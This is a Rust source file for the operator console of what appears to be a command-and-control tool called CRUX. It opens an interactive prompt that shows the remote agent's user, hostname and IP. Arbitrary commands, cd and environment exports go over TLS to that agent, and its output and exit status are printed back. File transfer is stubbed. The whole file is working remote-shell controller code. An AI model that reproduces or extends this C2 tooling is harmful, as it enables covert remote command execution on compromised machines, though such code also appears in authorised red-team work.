#[path = "../utils/mod.rs"]
mod utils;

// crates
use colored::Colorize;
use clap::error::Result;
use native_tls::TlsStream;
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;

// std
use std::net::{TcpStream};
use std::collections::HashMap;

// my stuff
use utils::network::{write_length_prefix, read_length_prefix};
use utils::data::{Message, Metadata, CmdType};
use utils::shell_var::{parse_var_def, variable_substitution};


fn send_cmd(stream: &mut TlsStream<TcpStream>, cmd_type: CmdType, args_str: String) -> Result<(),Box<dyn std::error::Error>>{
    let cmd = Message::Cmd {
        id: 0, // Placeholder
        cmd_type: cmd_type,
        args: args_str
    };
    let cmd_str = serde_json::to_string(&cmd)?;
    write_length_prefix(stream, cmd_str.as_bytes())?;
    return Ok(());
}

fn receive_output(stream: &mut TlsStream<TcpStream>) -> Result<Message,Box<dyn std::error::Error>>{
    let message: Message = serde_json::from_slice(&read_length_prefix(stream)?)?;
    return Ok(message);
}

// Determine prompt symbol based on username
fn parse_prompt_symbol(username: &str) -> String {
    match username {
        "root" => return '#'.to_string(),
        _ => return '$'.to_string()
    };
}

pub fn linux_shell(stream: &mut TlsStream<TcpStream>, meta_str: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Prompt Preparation
    let mut cmd_status = 0;
    let metadata: Metadata = serde_json::from_str(&meta_str)?;

    let prompt_symbol = parse_prompt_symbol(&metadata.username);
    let peer_ip = stream.get_ref().peer_addr()?.to_string();
    let mut rl = DefaultEditor::new()?;

    // Hash map for shell variables
    // Look out for concurrency safety issues potentially
    let mut shell_var_map: HashMap<String, String> = HashMap::new();

    // Main CLI loop
    loop {
        let mut prompt = format!("{}|{}@{}|{}|{} ",
            "CRUX".yellow().bold(),
            metadata.username.blue().bold(),
            metadata.hostname.cyan().bold(),
            peer_ip.red().bold(),
            prompt_symbol.green().bold());
        // Prepend cmd_status if it's not 0
        if cmd_status != 0 {
            prompt = format!("[{}]{}", cmd_status.to_string().red().bold(), prompt);
        }

        match rl.readline(&prompt) {
            Ok(input) => {
                if input.is_empty() {
                    continue;
                }
                // Record history
                let _ = rl.add_history_entry(input.as_str());

                // Handle input
                let input = variable_substitution(input.trim(), &shell_var_map);
                let mut parts = input.splitn(2, ' ');
                let cmd = match parts.next() {
                    Some(cmd) => cmd,
                    _none => continue,
                };
                let args = parts.next().unwrap_or("");

                match cmd {
                    "exit" | "quit" => {
                        send_cmd(stream, CmdType::Exit, "".to_string())?;
                        break;
                    }
                    "cd" => {
                        send_cmd(stream, CmdType::Cd, args.to_string())?;
                    }
                    "setvar" => {
                        match parse_var_def(&args) {
                            Ok(var_tuple) => {
                                shell_var_map.insert(var_tuple.0, var_tuple.1);
                            }
                            Err(e) => {
                                eprintln!("Error parsing shell variable definition: {}", e)
                            }
                        }
                        continue;
                    }
                    "export" => {
                        send_cmd(stream, CmdType::Export, args.to_string())?;
                    }
                    "download" => {
                        println!("File download feature under construction...");
                        continue;
                    }
                    "upload" => {
                        println!("File upload feature under construction...");
                        continue;
                    }
                    "clear" => { // Currently not working for some reason
                        print!("\x1B[2J");
                        continue;
                    }
                    "lhost" => {
                        println!("{}", stream.get_ref().local_addr()?);
                        continue;
                    }
                    "rhost" => {
                        println!("{}", stream.get_ref().peer_addr()?);
                        continue;
                    }
                    // Default goes to Exec
                    _ => {
                        send_cmd(stream, CmdType::Exec, input.to_string())?;
                    }
                }
                // Receive and parse command output
                while let Ok(msg) = receive_output(stream) {
                    match msg {
                        Message::CmdOutput { id:_, data } => {
                            println!("{}", data.trim());
                        }
                        Message::CmdError { id:_, error } => {
                            eprintln!("{}", error.trim());
                            cmd_status = -1;
                            break;
                        }
                        Message::CmdExit { id:_, status } => {
                            cmd_status = status;
                            break;
                        }
                        _ => {
                            continue
                        }
                    }
                }
                // Onto the next Iteration of the shell loop
            } // Ok(input)
            Err(ReadlineError::Interrupted) => {
                // TODO: Signal Agent to cancel execution
                continue;
            }
            Err(ReadlineError::Eof) => {
                break;
            }
            Err(err) => {
                eprintln!("Error: {:?}", err);
                break;
            }
        }
    }
    return Ok(())
}
